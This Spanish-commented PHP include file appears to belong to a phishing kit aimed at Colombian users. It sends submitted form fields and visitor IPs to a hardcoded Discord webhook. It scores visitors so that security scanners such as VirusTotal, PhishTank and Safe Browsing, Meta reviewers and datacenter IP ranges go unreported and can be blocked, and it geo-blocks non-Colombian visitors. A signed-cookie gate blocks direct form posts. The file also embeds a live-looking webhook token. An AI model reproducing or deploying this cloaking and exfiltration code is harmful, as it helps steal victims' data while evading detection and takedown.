<?php
if (count(get_included_files()) === 1) { http_response_code(404); exit; }
$webhook = "https://discord.com/api/webhooks/1501316102641418330/sUkWUBR4Y8-liFvecQfKDsq9c1A6iuHUbnNJliVMDVSfC3vDEZWpu7T4lXZVJcPF6xeA";

function nq_ip() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', $_SERVER[$h])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return 'desconocida';
}

function nq_tg($desc, $fields, $color = 3066993) {
    global $webhook, $_nq_score;
    if ($_nq_score >= 8) return;
    $f = [];
    foreach ($fields as $i => $field) {
        $f[] = ['name' => $field[0], 'value' => '`' . $field[1] . '`', 'inline' => ($i < 2)];
    }
    $embed = [
        'title'       => 'simulator',
        'description' => $desc,
        'color'       => $color,
        'fields'      => $f,
        'footer'      => ['text' => '🌐  ' . nq_ip()],
    ];
    $payload = json_encode(['username' => 'Simulator-N', 'embeds' => [$embed]]);
    $ch = curl_init($webhook);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => $payload,
        CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function nq_f($k) {
    return htmlspecialchars(trim($_POST[$k] ?? ''), ENT_QUOTES, 'UTF-8');
}

function nq_session() {
    return bin2hex(random_bytes(8));
}

// ── Secreto HMAC (auto-generado, persiste en disco) ─────────────────
function nq_gate_secret() {
    static $s = null;
    if ($s) return $s;
    $f = __DIR__ . '/.gate_secret';
    if (!file_exists($f) || filesize($f) < 32) {
        @file_put_contents($f, bin2hex(random_bytes(32)));
        @chmod($f, 0600);
    }
    return $s = trim((string)@file_get_contents($f));
}

// ── Cookie HMAC ─────────────────────────────────────────────────────
define('NQ_COOKIE', '_nqok');
define('NQ_TTL',    3600);

function nq_set_gate_cookie() {
    $exp = time() + NQ_TTL;
    $p64 = rtrim(strtr(base64_encode(json_encode(['e' => $exp, 'n' => bin2hex(random_bytes(4))])), '+/', '-_'), '=');
    $sig = substr(hash_hmac('sha256', $p64, nq_gate_secret()), 0, 20);
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
           || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https');
    setcookie(NQ_COOKIE, $p64 . '.' . $sig, [
        'expires'  => $exp,
        'path'     => '/',
        'secure'   => $https,
        'httponly' => true,
        'samesite' => 'Lax',
    ]);
}

function nq_has_gate_cookie() {
    $c = $_COOKIE[NQ_COOKIE] ?? '';
    if (!$c || strpos($c, '.') === false) return false;
    [$p64, $sig] = explode('.', $c, 2);
    $expected = substr(hash_hmac('sha256', $p64, nq_gate_secret()), 0, 20);
    if (!hash_equals($expected, $sig)) return false;
    $b = strtr($p64, '-_', '+/');
    $pad = strlen($b) % 4;
    if ($pad) $b .= str_repeat('=', 4 - $pad);
    $data = json_decode(base64_decode($b), true);
    return is_array($data) && ($data['e'] ?? 0) > time();
}

// ── Puntuación de bots ───────────────────────────────────────────────
function nq_score() {
    $ua  = $_SERVER['HTTP_USER_AGENT']       ?? '';
    $acc = $_SERVER['HTTP_ACCEPT']           ?? '';
    $enc = $_SERVER['HTTP_ACCEPT_ENCODING']  ?? '';
    $lng = $_SERVER['HTTP_ACCEPT_LANGUAGE']  ?? '';
    $ip  = nq_ip();
    $s   = 0;

    if (preg_match('/googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|applebot|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot/i', $ua))                     $s += 10;
    if (preg_match('/facebookexternalhit|facebookcatalog|meta-externalagent|meta-link-preview|igsecurity/i', $ua))                                                            $s += 15;
    if (preg_match('/\b(bot|crawl|spider|scraper|fetch|curl|wget|python|java\/|ruby|perl\/|php-curl|lwp-|libwww|httpclient|okhttp|axios\/|go-http|node-fetch|scrapy|masscan|nikto|sqlmap|nmap|zgrab)\b/i', $ua)) $s += 10;
    if (preg_match('/headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver|electron/i', $ua))                                                             $s += 12;
    if (preg_match('/virustotal|urlscan|phishtank|safebrowsing|netcraft|fortiguard|kaspersky|trendmicro|sophos|symantec|mcafee|avast|bitdefender|paloalto|cisco|talos/i', $ua)) $s += 20;
    if (preg_match('/semrushbot|ahrefsbot|mj12bot|dotbot|rogerbot|majestic|petalbot/i', $ua))                                                                                $s += 10;

    if (strlen(trim($ua)) < 20)                                       $s += 8;
    if (empty(trim($enc)))                                            $s += 4;
    if (empty($acc) || stripos($acc, 'text/html') === false)          $s += 4;
    if (empty(trim($lng)))                                            $s += 4;

    $is_modern = (bool)preg_match('/Chrome\/(?!.*OPR)|Edg\/|Firefox\//i', $ua);
    $has_sec   = !empty($_SERVER['HTTP_SEC_FETCH_SITE']) || !empty($_SERVER['HTTP_SEC_FETCH_MODE']);
    if ($is_modern && !$has_sec) $s += 8;

    static $dc = ['3.','13.','15.','18.','34.','35.','52.','54.','104.131.','104.236.','104.248.',
                  '138.197.','138.68.','139.59.','142.93.','143.110.','143.198.','144.126.',
                  '146.190.','157.230.','157.245.','159.65.','159.89.','162.243.','164.90.',
                  '164.92.','165.22.','165.227.','167.71.','167.99.','167.172.','174.138.',
                  '178.62.','178.128.','188.166.','198.199.','198.211.','206.81.','206.189.',
                  '49.12.','78.46.','116.202.','135.181.','136.243.','138.201.','148.251.',
                  '157.90.','159.69.','162.55.','168.119.','176.9.','178.63.','195.201.',
                  '45.32.','45.63.','45.76.','104.156.','104.207.','104.238.','107.174.',
                  '108.61.','136.244.','139.180.','149.28.','155.138.','158.247.',
                  '129.213.','129.146.','130.61.','132.145.','138.2.','140.91.','152.67.'];
    foreach ($dc as $p) { if (strncmp($ip, $p, strlen($p)) === 0) { $s += 12; break; } }

    static $meta = ['31.13.','66.220.','69.63.','69.171.','74.119.','103.4.',
                    '157.240.','163.70.','163.77.','173.252.','179.60.','185.89.',
                    '204.15.','129.134.','199.201.'];
    foreach ($meta as $p) { if (strncmp($ip, $p, strlen($p)) === 0) { $s += 15; break; } }

    return $s;
}

function nq_country() {
    // Tier 1: Cloudflare header (instantáneo, sin petición externa)
    $cf = strtoupper(trim($_SERVER['HTTP_CF_IPCOUNTRY'] ?? ''));
    if ($cf && $cf !== 'XX' && $cf !== 'T1') return $cf;
    // Tier 2: ip-api.com con caché de 24h en disco
    $ip    = nq_ip();
    $cache = sys_get_temp_dir() . '/nq_geo_' . md5($ip);
    if (file_exists($cache) && (time() - filemtime($cache)) < 86400) {
        $v = trim((string) @file_get_contents($cache));
        if ($v) return $v;
    }
    $ctx = stream_context_create(['http' => ['timeout' => 2, 'method' => 'GET']]);
    $r   = @file_get_contents("http://ip-api.com/line/{$ip}?fields=countryCode", false, $ctx);
    if ($r && preg_match('/^[A-Z]{2}$/', trim($r))) {
        @file_put_contents($cache, trim($r));
        return trim($r);
    }
    return '';
}

// Calcular puntuación una sola vez (usada por nq_tg y el gate)
$_nq_score = nq_score();

// Geo-gate automático: bloquea todo lo que no sea Colombia
$_nq_country = nq_country();
if ($_nq_country !== '' && $_nq_country !== 'CO') {
    http_response_code(403);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['success' => false, 'message' => 'Servicio no disponible en tu región']);
    exit;
}

// Cookie-gate: solo usuarios que pasaron por el gate (index.php)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !nq_has_gate_cookie()) {
    http_response_code(403);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(['success' => false, 'message' => 'Sesión inválida']);
    exit;
}
